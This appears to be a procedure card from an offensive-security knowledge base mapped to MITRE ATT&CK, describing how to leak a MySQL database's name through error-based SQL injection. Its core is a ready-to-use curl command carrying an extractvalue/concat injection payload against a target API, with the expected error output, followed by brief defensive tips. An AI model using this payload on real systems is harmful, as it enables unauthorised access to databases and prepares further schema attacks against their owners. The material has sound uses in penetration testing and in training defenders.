---
id: proc-uuid-003
name: Leak-Current-Database-Name-via-SQL-Injection
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.499Z'
tactics:
  - '[[Discovery]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - sqli
  - database-leak
  - mysql
commands:
  - '[[commands/curl-leak-database]]'
platforms:
  - Web
  - MySQL
tools: []
skill_level: intermediate
impact_level: medium
detection_risk: high
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Leak-Current-Database-Name-via-SQL-Injection

## Summary

This procedure extracts the current database name using SQL injection to inform targeted schema queries.

## Description

Replace the select with database() to leak the DB name in the XPATH error, e.g., 'mydb', enabling focused queries on information_schema.

## Requirements

1. Prior steps successful
2. curl access

## Defense

- Use ORM parameterization
- Mask database names in errors
- Intrusion detection for SQL patterns

## Objectives

1. Identify target database
2. Scope schema attacks

## Instructions

### Step 1: Inject Database Payload

**Context**: Select database() for name leak.

**Command** ([[commands/curl-leak-database]]):
```bash
curl -X GET "https://target.com/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+database()))))=1--%20aa" -H "Host: target.com"
```

> Expected: Error with database name in syntax error string.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-leak-database]]

## Tools Used


## Tags

- [[sqli]]
- [[database-leak]]
- [[mysql]]
